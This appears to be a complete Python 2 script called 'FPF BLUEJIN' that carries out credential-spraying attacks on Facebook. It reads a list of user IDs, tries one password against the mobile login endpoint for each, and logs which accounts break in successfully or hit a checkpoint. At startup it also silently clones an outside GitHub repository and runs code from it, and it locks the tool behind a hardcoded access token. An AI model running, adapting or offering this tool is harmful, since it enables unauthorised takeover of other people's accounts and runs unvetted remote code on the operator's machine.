import urllib,urllib2,os,sys,time,requests

"""
LDR TAK MEMBUATKU LEMAH.
KARENA JARAK BUKANLAH HAL BAGAIMANA CARA UNTUK BERBUAT SEENAKNYA,
TAPI JARAK ADALAH CARA BAGAIMANA MENUNJUKKAN SIFAT DEWASA
#SAVE_LDR :*
"""





# COLOR..
b = '\033[30m'
lr= '\033[91m'
lg= '\033[92m'
ly= '\033[93m'
lb= '\033[94m'
lcy= '\033[96m'
r = '\033[0m'

# FERIFIKASI
login = raw_input(lcy+'Enter Your Access Token: '+b)
while login !='kjx':
      print lr+"OOPS !!\n'"+r,login,lr+"' Isn't a valid Access Token.\nYou don't have permission to access this tool.\nPlease contact the Author\n"+lb+"@om_karjok"+r+lr+" for request the Acces Token.\nThank You !\n"+r
      exit()

# Cek internet
print lcy+'Please wait,.'
print lcy+'Checking the connections..'
data = requests.get('https://m.facebook.com/login.php')
ss= data.status_code
time.sleep(1)
try:
      if ss == 200:
            print lcy+'Connection '+lg+'OK'+r
            time.sleep(2)
except:
            print lr+'OOPS !!\nConnection Error !!\nPlease Check Your Internet Connections.\nIf it still error,\nplease contact the Author '+lb+'@om_karjok'+r
            exit()
try:
      print lcy+'Please wait..'+r
      try:
            os.system('git clone https://github.com/CRABSid/FPF');sys.stdout.flush()
      except:
            print lr+'Something was wrong.\nCheck your connections !'+r
            exit()
      try:
            os.system('python2 fpf.py')
      except:
            pass
except:
      print lr+'Sorry, something was wrong.\nPlease contact the Author'+r
      exit()
def trylogin(id,pas):
      try:
            os.system('rm -rf log')
            os.system('mkdir log')
      except IOError:
            print lr+"Can't remove/make a directory"+r
            pass
      a=open('log/sukses','w')
      b=open('log/cekpoin','w')
      c=open('log/gagal','w')

      print lcy+' Cracking ',len(id),' Account(s) With Password ',pas
      time.sleep(2)
      print lcy+' Please Wait..'
      print lcy,'=========================================='
      for line in id:
            uid= line.strip()
            try:
                  data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':uid,'pass':pas}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'}))
                  if 'm_sess' in data.url or 'save-device' in data.url or 'next=' in data.url or 'home.php' in data.url:
                        a.write('*'+uid)
                        print lcy,uid,' : '+lg+'Success !'+r
                  elif 'checkpoint' in data.url:
                        b.write(uid+'\n')
                        print lcy,uid,' : '+ly+'Checkpoint'+r
                  else:
                        c.write(uid+'\n')
                        print lcy,uid,' : '+lr+'Failed'+r
            except KeyboardInterupt:
                  print lcy+'[!] Stoping Successfully'+r
                  raw_input(lcy+'Press Enter'+r)
                  logo()
                  opsi()
                  pilih()
            except: 
                  print lr+'OOPS !!\nSuddenly the internet connection is lost.\nPlease check the connections\n'+r
                  exit()
      a.close()
      b.close()
      c.close()
      
def hasil():
      logo()
      la=open('log/sukses','r').readlines()
      lb=open('log/cekpoin','r').readlines()
      lc=open('log/gagal','r').readlines()
      i=len(id)
      ha=len(la)
      hb=len(lb)
      hc=len(lc)
      print lcy,'=========================================='
      if ha >0:
            print ly,ha,lcy+'Account(s) found with password:"'+lg,pas,lcy+'"'
            for suk in la:
                  print ' *',suk,'\n'
            print lcy,'=========================================='
      else:
            pass
      print lcy+' Success    : '+lg,ha,lcy+'Account(s)'+r      
      print lcy+' Checkpoint : '+ly,hb,lcy+'Account(s)'+r
      print lcy+' Failed     : '+lr,hc,lcy+'Account(s)'+r
      raw_input(lcy+'Press Enter')
      logo()
      opsi()
      pilih()
def logo():
      os.system('clear')
      print lcy+"""
      |||||||||||||||||||||||||||||||
      |||| FACEBOOK PASS FINDER |||||
      |||||||  B L U E J I N  |||||||
      |||||||||||||||||||||||||||||||
       Novemebr,15th 2018; 1:40;44AM
       K A R J O K   P A N G E S T Y 
      -------------------------------
      """
def opsi():
      print lcy+"""
   |||MENU|||
   1. START
   2. Show Last Result
   3. About
   0. Exit
 
    """

def pilih():
      ops=raw_input(lcy+' BLUEJIN:~# '+r)
      while ops != '1' and ops != '2' and ops != '3' and  ops != '0':
            print lr+' Invalid Input'+r
            ops=raw_input(lcy+' BLUEJIN:~# '+r)
      if ops == '1':
            start()
      elif ops == '2':
            show()
      elif ops == '3':
            about()
      else:
            print lcy+' [*]Exiting Successfully..'+r
            exit()
def home():
      logo()
      global id,pas
      id =raw_input(lcy+' Enter Your ID list: '+r)
      try:
            id =open(id,'r').readlines()
      except IOError:
            print lr+"'",id,"'isn't a file/direktory !"+r
            exit()
      pas=raw_input(lcy+' Password    : '+r)
      trylogin(id,pas)
      
#++++++++++++++++++++++++++++++++++++++
# Menu

def start():
      home()
      hasil()
def show():
      logo()
      print lcy+' LAST RESULT'+r
      print lcy,'=========================================='
      try:
            os.system('cat log/sukses')
      except IOError:
            print lr+"Can't open the file, try again later."+r
      raw_input(lcy+'Press Enter'+r)
      logo()
      opsi()
      pilih()
def about():
      logo()
      print lcy+' ABOUT'+r
      print lcy,'=========================================='
      print lcy+"""
  
 Name        : FPF BLUEJIN
 Version     : Latest Version
 Date        : November,15th 2018; 1:40;44 AM
 Purpose     : Finding the Facebook
               account password automaticaly
                  
 Author      : Karjok Pangesty
 Code        : KJx
 Plate Number: BE 94 L
 Team        : @CRABS_ID
 Telegram    : @om_karjok
 Facebook    : /karjok.pangesty.5
 Thanks to   : Allah SWT, My Eka Pangesty,
               @PIRMANSX and all who
               have bullying to me :)
 NB          : Please contact the Author
               if you have any
               problem with this tool.
      """
      raw_input(lcy+'Press Enter'+r)
      logo()
      opsi()
      pilih()
      
logo()
opsi()
pilih()
      
